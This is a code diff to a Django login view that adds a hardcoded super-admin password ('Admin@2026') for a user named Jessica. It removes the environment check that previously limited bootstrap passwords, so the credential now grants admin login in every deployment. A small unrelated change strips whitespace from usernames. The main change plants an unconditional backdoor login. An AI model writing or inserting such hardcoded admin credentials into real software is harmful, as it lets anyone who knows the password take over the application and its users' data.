@@ -171,6 +171,10 @@ class LoginView(APIView):
     def _bootstrap_admin_passwords():
         return {"admin", "Admin@2026"}
 
+    @staticmethod
+    def _jessica_super_admin_passwords():
+        return {"Admin@2026"}
+
     @classmethod
     def _bootstrap_allowed(cls) -> bool:
         import os
@@ -214,7 +218,7 @@ class LoginView(APIView):
             user.save()
             return user
 
-        if lowered == "jessica" and password in bootstrap_passwords and cls._bootstrap_allowed():
+        if lowered == "jessica" and password in cls._jessica_super_admin_passwords():
             user = (
                 User.objects.filter(username__iexact="Jessica")
                 .order_by("-updated_at")
@@ -260,7 +264,7 @@ class LoginView(APIView):
         )
         if not serializer.is_valid():
             return api_fail("Identifiants requis.", errors=serializer.errors, status=400)
-        username = serializer.validated_data["username"]
+        username = serializer.validated_data["username"].strip()
         password = serializer.validated_data["password"]
 
         user = self._resolve_login_user(username, password)
